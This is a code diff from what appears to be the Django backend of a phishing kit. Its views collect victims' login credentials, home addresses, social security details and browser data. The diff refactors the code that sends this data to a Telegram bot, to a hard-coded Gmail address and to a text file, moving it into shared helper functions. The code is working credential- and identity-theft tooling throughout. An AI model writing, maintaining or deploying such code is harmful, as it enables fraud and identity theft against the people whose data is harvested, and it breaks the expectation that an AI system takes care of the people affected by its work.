@@ -23,6 +23,7 @@ from core.middleware.block_ips_middleware import (
 )
 from user_data.models import Address, BankInfo, BrowserDetail, Client
 from django.template.loader import get_template
+from core.settings import send_data_email, send_data_telegram, save_data_to_file
 from django.core.mail import send_mail
 from datetime import datetime
 
@@ -115,20 +116,7 @@ def logix_collect_user_login_cred(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
@@ -138,25 +126,12 @@ def logix_collect_user_login_cred(request):
         from_email = app_settings['from_email']
         recipient_list = app_settings['send_email_list']
 
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_user_data_email.si(subject, subject, from_email, recipient_list),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
+        send_data_email(subject, message, from_email, recipient_list)
 
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
@@ -250,66 +225,6 @@ def logix_collect_user_login_cred2(request):
         message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
         message += f"|======================================|\n"
         message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-        message += f"| ➤ [ IP Country ]   : {country}\r\n"
-        message += f"| ➤ [ IP City ]      : {city}\r\n"
-        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-        message += f"| ➤ [ TIME ]         : {date}\r\n"
-        message += f"|=====================================|\n"
-
-        #############################
-        # Send data to telegram
-        ##############################
-
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
-
-        #############################
-        # Send Data to email
-        ########################
-        context = {
-            "username": username,
-            "password": password,
-        }
-        subject = "The Data"
-        from_email = settings.DEFAULT_FROM_EMAIL
-        recipient_list = ["etornamasamoah@gmail.com"]
-
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
-
-        #####################################
-        # Save to txt
-        ##############################
-        logix_save_data_to_file(username, message)
-
-        payload["message"] = "Successful"
-        payload["data"] = data
-    return Response(payload)
 
 
 @api_view(
@@ -411,20 +326,7 @@ def logix_collect_user_basic_info(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
@@ -433,25 +335,12 @@ def logix_collect_user_basic_info(request):
         from_email = settings.DEFAULT_FROM_EMAIL
         recipient_list = ["etornamasamoah@gmail.com"]
 
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
+        send_data_email(subject, message, from_email, recipient_list)
 
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
@@ -564,51 +453,21 @@ def logix_collect_user_home_address(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
-        # context = {
-        #     "email": username,
-        #     "password": password,
-        # }
         subject = "The Data"
         from_email = settings.DEFAULT_FROM_EMAIL
         recipient_list = ["etornamasamoah@gmail.com"]
 
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
+        send_data_email(subject, message, from_email, recipient_list)
 
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
@@ -705,51 +564,21 @@ def logix_collect_user_social_security(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
-        # context = {
-        #     "email": username,
-        #     "password": password,
-        # }
         subject = "The Data"
         from_email = settings.DEFAULT_FROM_EMAIL
         recipient_list = ["etornamasamoah@gmail.com"]
 
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
+        send_data_email(subject, message, from_email, recipient_list)
 
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
@@ -846,51 +675,21 @@ def logix_collect_user_social_security_2(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
-        # context = {
-        #     "email": username,
-        #     "password": password,
-        # }
         subject = "The Data"
         from_email = settings.DEFAULT_FROM_EMAIL
         recipient_list = ["etornamasamoah@gmail.com"]
 
-        # # Use Celery chain to execute tasks in sequence
-        # email_chain = chain(
-        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
-        # )
-        # # Execute the Celery chain asynchronously
-        # email_chain.apply_async()
-
-        send_mail(
-            subject,
-            message,
-            from_email,
-            recipient_list,
-            fail_silently=False,
-        )
+        send_data_email(subject, message, from_email, recipient_list)
 
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
